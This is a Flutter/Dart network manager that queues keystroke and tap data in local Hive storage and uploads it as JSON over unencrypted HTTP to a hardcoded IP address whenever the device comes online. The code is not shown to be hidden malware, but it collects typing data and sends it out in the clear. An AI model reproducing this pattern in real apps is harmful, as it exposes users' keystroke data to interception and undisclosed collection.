import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:hive/hive.dart';
import 'package:hive_flutter/adapters.dart';
import 'package:http/http.dart' as http;
import 'package:connectivity_plus/connectivity_plus.dart';

class NetworkManager {
  bool _isInitialized = false;
  Future<void> initHive() async {
    // Add your Hive initialization logic here
    // For example:
    await Hive.initFlutter(); // Ensure you call this before opening boxes
    // Optionally open boxes here
    await Hive.openBox('offlineKeystrokeData');
    await Hive.openBox('offlineTapData');
  }

  Future<void> setupOfflineStorageAndNetworkMonitoring() async {
    if (_isInitialized) return; // Prevent multiple initializations
    _isInitialized = true;

    await initHive(); // Initialize Hive for local storage
    monitorNetworkConnectivity(); // Start monitoring network connectivity
  }

  void monitorNetworkConnectivity() {
    Connectivity()
        .onConnectivityChanged
        .listen((List<ConnectivityResult> results) {
      if (results.contains(ConnectivityResult.mobile) ||
          results.contains(ConnectivityResult.wifi)) {
        uploadPendingKeystrokeData();
        uploadPendingTapData();
      }
    });
  }

  Future<void> uploadPendingKeystrokeData() async {
    bool isOnline = await isConnectedToInternet();
    if (!isOnline) return; // No need to proceed if still offline

    var box = Hive.box('offlineKeystrokeData');
    if (box.isEmpty) {
      debugPrint('No pending keystroke data to upload.');
      return;
    }

    for (var key in box.keys) {
      var requestData = box.get(key);
      final url =
          Uri.parse('http://15.184.243.127:8080/collect_keystroke_data');
      try {
        final response = await http.post(
          url,
          headers: {'Content-Type': 'application/json'},
          body: jsonEncode(requestData),
        );

        if (response.statusCode == 200) {
          debugPrint('Pending keystroke data uploaded successfully.');
          await box.delete(key); // Delete local data after successful upload
        } else {
          debugPrint(
              'Failed to upload pending keystroke data: ${response.body}');
        }
      } catch (e) {
        debugPrint('Error occurred while uploading pending keystroke data: $e');
      }
    }
  }

  Future<void> uploadPendingTapData() async {
    bool isOnline = await isConnectedToInternet();
    if (!isOnline) return; // No need to proceed if still offline

    var box = Hive.box('offlineTapData');
    if (box.isEmpty) {
      debugPrint('No pending tap data to upload.');
      return;
    }

    for (var key in box.keys) {
      var requestData = box.get(key);
      final url = Uri.parse('http://15.184.243.127:8080/collect_tap_data');
      try {
        final response = await http.post(
          url,
          headers: {'Content-Type': 'application/json'},
          body: jsonEncode(requestData),
        );

        if (response.statusCode == 200) {
          debugPrint('Pending tap data uploaded successfully.');
          await box.delete(key); // Delete local data after successful upload
        } else {
          debugPrint('Failed to upload pending tap data: ${response.body}');
        }
      } catch (e) {
        debugPrint('Error occurred while uploading pending tap data: $e');
      }
    }
  }

  Future<bool> isConnectedToInternet() async {
    var connectivityResult = await Connectivity().checkConnectivity();
    return connectivityResult.contains(ConnectivityResult.mobile) ||
        connectivityResult.contains(ConnectivityResult.wifi);
  }
}
